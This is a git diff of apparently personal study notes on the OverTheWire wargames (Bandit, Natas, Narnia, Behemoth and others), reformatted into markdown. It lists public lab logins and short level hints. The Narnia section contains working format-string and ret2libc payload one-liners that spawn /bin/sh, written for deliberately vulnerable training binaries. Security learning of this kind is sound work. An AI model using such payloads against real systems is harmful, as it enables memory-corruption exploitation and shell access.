@@ -1,7 +1,6 @@
-OverTheWirehttps://overthewire.org/wargames/ 
-	write up : https://github.com/Lennart2001/overthewire-writeups/tree/main
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-bandit : basics
+## OverTheWirehttps://overthewire.org/wargames/ 
+- write up : https://github.com/Lennart2001/overthewire-writeups/tree/main
+## bandit : basics
 	--> username : bandit0 
 	--> password : bandit0 
 	--> url : bandit.labs.overthewire.org
@@ -89,8 +88,7 @@ bandit : basics
 		Level 31: git add | commit | push |  cat .gitignore
 		Level 32: $0
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-natas : web-security
+## natas : web-security
 	--> Username: natas0 
 	--> Password: natas0 | 
 	--> URL:http://natas0.natas.labs.overthewire.org
@@ -156,8 +154,7 @@ natas : web-security
 		level31:  Perl Jam 2 Pinnacle Attack
 		level33:  MD5 + Phar
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Leviathan : Difficulty:     1/10 |Levels:         8 | platform:   Linux/x86
+## Leviathan : Difficulty:     1/10 |Levels:         8 | platform:   Linux/x86
 	--> Username: leviathan0
 	--> Password: leviathan0
 	--> url : leviathan.labs.overthewire.org
@@ -178,8 +175,7 @@ Leviathan : Difficulty:     1/10 |Levels:         8 | platform:   Linux/x86
 		Level 1: cat bookmarks.html | grep password
 		Level 2: create a space file to evaded the check 
 		level 6: foe loop (.sh)
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Kryption : decode
+## Kryption : decode
 	--> username : krypton1 
 	--> password: KRYPTONISGREAT
 	--> url : krypton.labs.overthewire.org 
@@ -221,8 +217,7 @@ Kryption : decode
 
 		print(password)
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Narnia : basic exploitation -- common bugs
+## Narnia : basic exploitation -- common bugs
 	--> username : narnia0
 	--> password : narnia0
 	--> url : narnia.labs.overthewire.org
@@ -249,8 +244,7 @@ Narnia : basic exploitation -- common bugs
 		level5 : ./narnia5 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xd0\xd5\xff\xff\xd0\xd5\xff\xff%492x%n")')
 		level6 : ./narnia6 $(python3 -c 'import sys; sys.stdout.buffer.write(b"AAAAAAAA" + b"\x70\x81\xc4\xf7")') "BBBBBBBB/bin/sh"
 		level7 : ./narnia7 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x08\xd5\xff\xff" + b"%134517531d%2$n")') // decimal value 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Behemoth : regular vulnerabilities --  common coding mistakes 
+## Behemoth : regular vulnerabilities --  common coding mistakes 
 	--> buffer overflows, race conditions and privilege escalation
 	--> username : behemoth0
 	--> password : behemoth0
@@ -273,9 +267,7 @@ Behemoth : regular vulnerabilities --  common coding mistakes
 		
 end game // is ok // no need learn too many pwn 
 
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Utumno : 
+## Utumno : 
 	--> username : utumno0
 	--> password : utumno0
 	--> url : utumno.labs.overthewire.org 
@@ -293,8 +285,7 @@ Utumno :
 		-->6: 
 		-->7: 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Maze :  exploitation-techniques, programming (of course) and reverse-engineering
+## Maze :  exploitation-techniques, programming (of course) and reverse-engineering
 	--> username : maze0
 	--> password : maze0
 	--> url : maze.labs.overthewire.org
@@ -312,8 +303,7 @@ Maze :  exploitation-techniques, programming (of course) and reverse-engineering
 		-->6: 
 		-->7: 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Vortex : (27 level)
+## Vortex : (27 level)
 	--> username : maze0
 	--> password : maze0
 	--> url : vortex.labs.overthewire.org
@@ -321,8 +311,7 @@ Vortex : (27 level)
 	-->  /vortex/. 
 	--> https://overthewire.org/wargames/vortex/vortex0.html
 	
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Manpage :   common linux c-programming misconceptions
+## Manpage :   common linux c-programming misconceptions
 	--> username : manpage0
 	--> password : manpage0
 	--> url : manpage.labs.overthewire.org 
@@ -338,14 +327,12 @@ Manpage :   common linux c-programming misconceptions
 		-->6: 
 		-->7: 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Drifter : harder Vortex  (15 level)
+## Drifter : harder Vortex  (15 level)
 	--> url : drifter.labs.overthewire.org
 	--> port: 2230
 	--> https://overthewire.org/wargames/drifter/drifter0.html
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-FormulaOne : (6 level)
+## FormulaOne : (6 level)
 	--> url :formulaone.labs.overthewire.org
 	--> Port: 2232
 	--> /formulaone/.
